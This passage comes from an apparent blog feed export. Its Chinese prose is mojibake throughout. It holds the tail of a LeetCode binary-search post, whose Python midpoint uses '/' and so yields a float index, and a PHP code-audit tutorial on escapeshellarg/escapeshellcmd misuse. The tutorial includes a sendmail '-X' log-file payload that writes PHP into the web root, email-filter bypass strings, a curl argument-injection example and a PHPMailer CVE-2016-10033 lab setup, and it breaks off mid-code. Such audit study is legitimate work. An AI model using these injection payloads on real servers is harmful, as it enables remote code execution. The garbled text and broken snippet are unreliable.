<p>è¿™ç§æ–¹æ³•å…¶å®æ¯”è¾ƒå–å·§ï¼Œè€Œé¢˜ç›®çš„æ„å›¾æ˜¯æƒ³è¦è€ƒå¯ŸäºŒåˆ†æŸ¥æ‰¾ã€‚</p>
</blockquote>
<h4 id="æ–¹æ³•äºŒ-v9">æ–¹æ³•äºŒ</h4>
<p><strong>æ€è·¯</strong></p>
<p>äºŒåˆ†æ³•æŸ¥æ‰¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchInsert</span>(<span class="params">self, nums: List[int], target: int</span>) -&gt; int:</span></span><br><span class="line">        low = <span class="number">0</span></span><br><span class="line">        high = len(nums)</span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = low + (high - low)/<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] &gt; target:</span><br><span class="line">                high = mid</span><br><span class="line">            <span class="keyword">elif</span> nums[mid] &lt; target:</span><br><span class="line">                low = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">return</span> low</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Leetcode</tag>
        <tag>ç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day5</title>
    <url>/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5/</url>
    <content><![CDATA[<h1 id="PHPä»£ç å®¡è®¡å­¦ä¹ Day5â€”â€”escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“">PHPä»£ç å®¡è®¡å­¦ä¹ Day5â€”â€”escapeshellargä¸escapeshellcmdä½¿ç”¨ä¸å½“</h1>
<h2 id="0x01-postcart">0x01 postcart</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params">$email</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> escapeshellarg($email);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">&#x27;to&#x27;</span>])) &#123;</span><br><span class="line">      $data[<span class="string">&#x27;to&#x27;</span>] = <span class="string">&#x27;none@ripstech.com&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $data[<span class="string">&#x27;to&#x27;</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">&#x27;to&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">&#x27;from&#x27;</span>])) &#123;</span><br><span class="line">      $data[<span class="string">&#x27;from&#x27;</span>] = <span class="string">&#x27;none@ripstech.com&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $data[<span class="string">&#x27;from&#x27;</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">&#x27;from&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">&#x27;subject&#x27;</span>])) &#123;</span><br><span class="line">      $data[<span class="string">&#x27;subject&#x27;</span>] = <span class="string">&#x27;No Subject&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">      $data[<span class="string">&#x27;message&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mail($data[<span class="string">&#x27;to&#x27;</span>], $data[<span class="string">&#x27;subject&#x27;</span>], $data[<span class="string">&#x27;message&#x27;</span>],</span><br><span class="line">      <span class="string">&#x27;&#x27;</span>, <span class="string">&quot;-f&quot;</span> . $data[<span class="string">&#x27;from&#x27;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure>
<p>è¿™é“é¢˜å…¶å®æ˜¯è€ƒå¯Ÿç”± php å†…ç½®å‡½æ•° <strong>mail</strong> æ‰€å¼•å‘çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æˆ‘ä»¬å…ˆçœ‹çœ‹ php è‡ªå¸¦çš„ <strong>mail</strong> å‡½æ•°çš„ç”¨æ³•ï¼š</p>
<blockquote>
<p>mail ( string <code>$to</code> , string <code>$subject</code> , string <code>$message</code> [, <a href="https://www.php.net/manual/en/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$additional_headers</code> [, string <code>$additional_parameters</code> ]] ) : bool</p>
<ul>
<li>toï¼ŒæŒ‡å®šé‚®ä»¶æ¥æ”¶è€…ï¼Œå³æ¥æ”¶äºº</li>
<li>subjectï¼Œé‚®ä»¶çš„æ ‡é¢˜</li>
<li>messageï¼Œé‚®ä»¶çš„æ­£æ–‡å†…å®¹</li>
<li>additional_headersï¼ŒæŒ‡å®šé‚®ä»¶å‘é€æ—¶å…¶ä»–çš„é¢å¤–å¤´éƒ¨ï¼Œå¦‚å‘é€è€…Fromï¼ŒæŠ„é€CCï¼Œéšè—æŠ„é€BCC</li>
<li>additional_parametersï¼ŒæŒ‡å®šä¼ é€’ç»™å‘é€ç¨‹åºsendmailçš„é¢å¤–å‚æ•°ã€‚</li>
</ul>
</blockquote>
<p>åœ¨Linuxç³»ç»Ÿä¸Šï¼Œ<code>send</code>å‡½æ•°é»˜è®¤è°ƒç”¨ <strong>Linux</strong> çš„ <strong><a href="http://www.sendmail.com/">sendmail</a></strong> ç¨‹åºå‘é€é‚®ä»¶ã€‚è€Œåœ¨é¢å¤–å‚æ•°( <strong>additional_parameters</strong> )ä¸­ï¼Œ <strong>sendmail</strong> ä¸»è¦æ”¯æŒçš„é€‰é¡¹æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š</p>
<blockquote>
<ul>
<li>
<p>-O option = value</p>
<p>QueueDirectory = queuedir é€‰æ‹©é˜Ÿåˆ—æ¶ˆæ¯</p>
</li>
<li>
<p>-X logfile</p>
<p>è¿™ä¸ªå‚æ•°å¯ä»¥æŒ‡å®šä¸€ä¸ªç›®å½•æ¥è®°å½•å‘é€é‚®ä»¶æ—¶çš„è¯¦ç»†æ—¥å¿—æƒ…å†µã€‚</p>
</li>
<li>
<p>-f from email</p>
<p>è¿™ä¸ªå‚æ•°å¯ä»¥è®©æˆ‘ä»¬æŒ‡å®šæˆ‘ä»¬å‘é€é‚®ä»¶çš„é‚®ç®±åœ°å€ã€‚</p>
</li>
</ul>
</blockquote>
<h3 id="æ¼æ´ä¸€">æ¼æ´ä¸€</h3>
<p>å†™ä¸€ä¸ªdemoï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$to = <span class="string">&quot;Alice@example/com&quot;</span>;</span><br><span class="line">$from = <span class="string">&quot;Hello Alice&quot;</span>;</span><br><span class="line">$message = <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>;</span><br><span class="line">$headers = <span class="string">&quot;CC: somebodyelse@example.com&quot;</span>;</span><br><span class="line">$options = <span class="string">&quot;-OQueueDirectory=/tmp -X /var/www/html/rce.php&quot;</span>;</span><br><span class="line">mail($to, $subject, $message, $header, $options);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢è¿™ä¸ªæ ·ä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ <strong>-X</strong> å‚æ•°æŒ‡å®šæ—¥å¿—æ–‡ä»¶ï¼Œæœ€ç»ˆä¼šåœ¨ <strong>/var/www/html/rce.php</strong> ä¸­å†™å…¥å¦‚ä¸‹æ•°æ®ï¼šè¿è¡Œä¹‹åä¼šç”Ÿæˆä¸€ä¸ª<code>rce.php</code>çš„æ—¥å¿—æ–‡ä»¶ï¼ŒæŸ¥çœ‹å…¶å†…å®¹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616094030.png" alt=""></p>
<h3 id="æ¼æ´äºŒ">æ¼æ´äºŒ</h3>
<p>ä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥åœ¨<code>$to</code>è¿™ä¸ªå­—æ®µæ³¨å…¥å‘½ä»¤ï¼Œå…³äºè¿™ä¸ªå­—æ®µä¸€å…±æœ‰ä¸‰å±‚è¿‡æ»¤ã€‚</p>
<h4 id="ç¬¬ä¸€å±‚ï¼šfilter-var">ç¬¬ä¸€å±‚ï¼šfilter_var</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filter_var($email, FILTER_VALIDATE_EMAIL)</span><br></pre></td></tr></table></figure>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200616094611224.png" alt="image-20200616094611224"></p>
<p>Pç‰›çš„ä¸€ç¯‡æ–‡ç« ä¹Ÿæåˆ°äº†æ€ä¹ˆç»•è¿‡<code>FILTER_VALIDATE_EMAIL</code>ï¼š<a href="https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html">https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html</a></p>
<p>è¿™é‡Œå°±ç”¨å‡ ä¸ªdemoæ¼”ç¤ºä¸€ä¸‹æ–¹ä¾¿ç†è§£ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$email1 = <span class="string">&#x27;12 3@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email1;</span><br><span class="line">var_dump(filter_var($email1, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$email2 = <span class="string">&#x27;12\ 3@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email2;</span><br><span class="line">var_dump(filter_var($email2, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$email3 = <span class="string">&#x27;&quot;12\ 3&quot;@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email3;</span><br><span class="line">var_dump(filter_var($email3, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$email4 = <span class="string">&#x27;&quot;123\&quot;\&#x27;&quot;@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email4;</span><br><span class="line">var_dump(filter_var($email4, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$email5 = <span class="string">&#x27;\&#x27;.&quot;123&quot;@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email5;</span><br><span class="line">var_dump(filter_var($email5, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$email6 = <span class="string">&#x27;\&quot;.&quot;123&quot;@test.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $email6;</span><br><span class="line">var_dump(filter_var($email6, FILTER_VALIDATE_EMAIL)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12 3@test.combool(false)</span><br><span class="line">12\ 3@test.combool(false)</span><br><span class="line">&quot;12\ 3&quot;@test.comstring(16) &quot;&quot;12\ 3&quot;@test.com&quot;</span><br><span class="line">&quot;123\&quot;&#39;&quot;@test.comstring(17) &quot;&quot;123\&quot;&#39;&quot;@test.com&quot;</span><br><span class="line">&#39;.&quot;123&quot;@test.comstring(16) &quot;&#39;.&quot;123&quot;@test.com&quot;</span><br><span class="line">\&quot;.&quot;123&quot;@test.combool(false)</span><br></pre></td></tr></table></figure>
<h4 id="ç¬¬äºŒå±‚ï¼šescapeshellarg">ç¬¬äºŒå±‚ï¼šescapeshellarg</h4>
<p>å®˜æ–¹æ–‡æ¡£ï¼š</p>
<blockquote>
<p><strong>escapeshellarg</strong> â€”â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°</p>
<p>åŠŸèƒ½ ï¼šescapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec()ï¼Œsystem() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·)</p>
</blockquote>
<p>demo1ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">$b=escapeshellarg($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;old: &quot;</span>.$a.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;now: &quot;</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//old: 123  now: &#x27;123&#x27; ä¸¤è¾¹åŠ ä¸Šå•å¼•å·</span></span><br></pre></td></tr></table></figure>
<p>demo2ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;12&#x27;3&quot;</span>;</span><br><span class="line">$b=escapeshellarg($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;old: &quot;</span>.$a.<span class="string">&quot;\t\t&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;now: &quot;</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//old: 12&#x27;3	 now: &#x27;12&#x27;\&#x27;&#x27;3&#x27; å•å¼•å·è¢«è½¬ä¹‰ï¼Œä¸¤è¾¹å‡åŠ ä¸Šå•å¼•å·</span></span><br></pre></td></tr></table></figure>
<h4 id="ç¬¬ä¸‰å±‚ï¼šescapeshellcmd">ç¬¬ä¸‰å±‚ï¼šescapeshellcmd</h4>
<p>PHPçš„ <strong>mail()</strong> å‡½æ•°åœ¨åº•å±‚å®ç°ä¸­ï¼Œè°ƒç”¨äº† <strong>escapeshellcmd()</strong> å‡½æ•°ï¼Œå®˜æ–¹æ–‡æ¡£ï¼š</p>
<blockquote>
<p><strong>escapeshellcmd()</strong> â€”â€” å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> æˆ– <a href="https://www.php.net/manual/zh/function.system.php">system()</a> å‡½æ•°ï¼Œæˆ–è€… <a href="https://www.php.net/manual/zh/language.operators.execution.php">æ‰§è¡Œæ“ä½œç¬¦</a> ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p>
<p>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š *&amp;#;`|*?~&lt;&gt;^()[]{}$*, <em>\x0A</em> å’Œ <em>\xFF</em>ã€‚ <em>â€™</em> å’Œ <em>&quot;</em> ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ <em>%</em> å’Œ <em>!</em> å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p>
</blockquote>
<p>demo1ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;12&quot;3&#x27;</span>;</span><br><span class="line">$b=escapeshellcmd($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;old: &quot;</span>.$a.<span class="string">&quot;\t\t&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;now: &quot;</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// old: 12&quot;3	 now: 12\&quot;3</span></span><br></pre></td></tr></table></figure>
<p>demo2ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;12&quot;3&quot;&#x27;</span>;</span><br><span class="line">$b=escapeshellcmd($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;old: &quot;</span>.$a.<span class="string">&quot;\t\t&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;now: &quot;</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//old: 12&quot;3&quot;  now: 12&quot;3&quot; æ³¨æ„ &#x27; å’Œ &quot; ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰</span></span><br></pre></td></tr></table></figure>
<p>é‚£æˆ‘ä»¬å‰é¢è¯´è¿‡äº†PHPçš„ <strong>mail()</strong> å‡½æ•°åœ¨åº•å±‚è°ƒç”¨äº† <strong>escapeshellcmd()</strong> å‡½æ•°å¯¹ç”¨æˆ·è¾“å…¥çš„é‚®ç®±åœ°å€è¿›è¡Œå¤„ç†ï¼Œå³ä½¿æˆ‘ä»¬ä½¿ç”¨å¸¦æœ‰ç‰¹æ®Šå­—ç¬¦çš„payloadï¼Œç»•è¿‡ <strong>filter_var()</strong> çš„æ£€æµ‹ï¼Œä½†è¿˜æ˜¯ä¼šè¢« <strong>escapeshellcmd()</strong> å¤„ç†ã€‚ç„¶è€Œ <strong>escapeshellcmd()</strong> å’Œ <strong>escapeshellarg</strong> ä¸€èµ·ä½¿ç”¨ï¼Œä¼šé€ æˆç‰¹æ®Šå­—ç¬¦é€ƒé€¸ï¼Œä¸‹é¢é€šè¿‡ä¸€ä¸ª<a href="https://paper.seebug.org/164/#_2">ç®€å•ä¾‹å­</a>ç†è§£ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $param=<span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line">    $a=escapeshellarg($param);</span><br><span class="line">    $b=escapeshellcmd($a);</span><br><span class="line">    $cmd=<span class="string">&quot;curl &quot;</span>.$b;</span><br><span class="line">	var_dump($a).<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">	var_dump($b).<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">	var_dump($cmd).<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¯¦ç»†åˆ†æä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š</p>
<ol>
<li>
<p>ä¼ å…¥çš„å‚æ•°æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#39; -v -d a&#x3D;1</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>ç”±äº<code>escapeshellarg</code>å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚æ‰€ä»¥å¤„ç†ä¹‹åçš„æ•ˆæœå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;127.0.0.1&#39;\&#39;&#39; -v -d a&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>æ¥ç€ <code>escapeshellcmd</code> å‡½æ•°å¯¹ç¬¬äºŒæ­¥å¤„ç†åå­—ç¬¦ä¸²ä¸­çš„ <code>\</code> ä»¥åŠ <code>a=1'</code> ä¸­çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>ç”±äºç¬¬ä¸‰æ­¥å¤„ç†ä¹‹åçš„payloadä¸­çš„ <code>\\</code> è¢«è§£é‡Šæˆäº† <code>\</code> è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥å•å¼•å·é…å¯¹è¿æ¥ä¹‹åå°†payloadåˆ†å‰²ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œå…·ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
</li>
</ol>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200616120152.png" alt=""></p>
<h2 id="0x02-å®ä¾‹åˆ†æ">0x02 å®ä¾‹åˆ†æ</h2>
<p>è¿™é‡Œå®ä¾‹åˆ†æé€‰æ‹© <strong>PHPMailer å‘½ä»¤æ‰§è¡Œæ¼æ´</strong> ï¼ˆ <strong>CVE-2016-10045</strong> å’Œ <strong>CVE-2016-10033</strong> ï¼‰ã€‚</p>
<h3 id="CVE-2016-10033">CVE-2016-10033</h3>
<p>åˆæ˜¯Pç‰›çš„æ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html">https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html</a></p>
<p>Seebugï¼š<a href="https://paper.seebug.org/161/">https://paper.seebug.org/161/</a></p>
<h4 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h4>
<p>Dockerfileï¼š</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">5.6</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; apt-get install -y sendmail</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;sendmail_path = &quot;/usr/sbin/sendmail -t -i&quot;&#x27;</span> &gt; /usr/<span class="built_in">local</span>/etc/php/php.ini</span></span><br></pre></td></tr></table></figure>
<p>æå‰ä¸‹è½½å¥½æºç ï¼Œåœ¨æºç æ ¹ç›®å½•ä¸‹æ·»åŠ æµ‹è¯•æ–‡ä»¶ 1.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;PHPMailerAutoload.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$mail = <span class="keyword">new</span> PHPMailer;</span><br><span class="line">$mail-&gt;setFrom($_GET[<span class="string">&#x27;x&#x27;</span>], <span class="string">&#x27;Vuln Server&#x27;</span>);</span><br><span class="line">$mail-&gt;Subject = <span class="string">&#x27;subject&#x27;</span>;</span><br><span class="line">$mail-&gt;addAddress(<span class="string">&#x27;c@d.com&#x27;</span>, <span class="string">&#x27;attacker&#x27;</span>);</span><br><span class="line">$mail-&gt;msgHTML(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">$mail-&gt;AltBody = <span class="string">&#x27;Body&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$mail-&gt;send();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>shellï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t cve-2016-10033 .</span><br><span class="line">docker run --rm --name vuln-phpmail -p 8080:80  -v &#x2F;home&#x2F;ca01h&#x2F;phpmail&#x2F;deploy&#x2F;PHPMailer-5.2.17:&#x2F;var&#x2F;www&#x2F;html cve-2016-10033</span><br></pre></td></tr></table></figure>
<h4 id="æ¼æ´åŸç†">æ¼æ´åŸç†</h4>
<p>æ¼æ´å…·ä½“ä½ç½®åœ¨ <strong>class.phpmailer.php</strong> ä¸­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">mailPassthru</span>(<span class="params">$to, $subject, $body, $header, $params</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Can&#x27;t use additional_parameters in safe_mode</span></span><br><span class="line">        <span class="comment">//@link http://php.net/manual/en/function.mail.php</span></span><br><span class="line">        <span class="keyword">if</span> (ini_get(<span class="string">&#x27;safe_mode&#x27;</span>) <span class="keyword">or</span> !<span class="keyword">$this</span>-&gt;UseSendmailOptions <span class="keyword">or</span> is_null($params)) &#123;</span><br><span class="line">            $result = @mail($to, $subject, $body, $header);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $result = @mail($to, $subject, $body, $header, $params);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œ<code>$param</code>ä½œä¸º<code>mail</code>çš„ç¬¬äº”ä¸ªå‚æ•°ï¼Œè¯¥å‚æ•°ç”¨äºæŒ‡å®š<code>sendmail</code>çš„é¢å¤–å‚æ•°ï¼Œå…¶ä¸­<code>sendmail</code>çš„<code>-X</code>å‚æ•°ä¼šå°†æµé‡è®°å½•åˆ°æ–‡ä»¶ä¸­ä»è€Œå†™æ–‡ä»¶å®ç° RCEï¼Œè¿›ä¸€æ­¥è·Ÿè·Ÿè¿› <strong>$params</strong> å‚æ•°ï¼Œçœ‹çœ‹å®ƒæ˜¯æ€ä¹ˆæ¥çš„ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mailSend</span>(<span class="params">$header, $body</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $toArr = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;to <span class="keyword">as</span> $toaddr) &#123;</span><br><span class="line">            $toArr[] = <span class="keyword">$this</span>-&gt;addrFormat($toaddr);</span><br><span class="line">        &#125;</span><br><span class="line">        $to = implode(<span class="string">&#x27;, &#x27;</span>, $toArr);</span><br><span class="line"></span><br><span class="line">        $params = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//This sets the SMTP envelope sender which gets turned into a return-path header by the receiver</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">            $params = sprintf(<span class="string">&#x27;-f%s&#x27;</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;Sender != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> !ini_get(<span class="string">&#x27;safe_mode&#x27;</span>)) &#123;</span><br><span class="line">            $old_from = ini_get(<span class="string">&#x27;sendmail_from&#x27;</span>);</span><br><span class="line">            ini_set(<span class="string">&#x27;sendmail_from&#x27;</span>, <span class="keyword">$this</span>-&gt;Sender);</span><br><span class="line">        &#125;</span><br><span class="line">        $result = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;SingleTo <span class="keyword">and</span> count($toArr) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($toArr <span class="keyword">as</span> $toAddr) &#123;</span><br><span class="line">                $result = <span 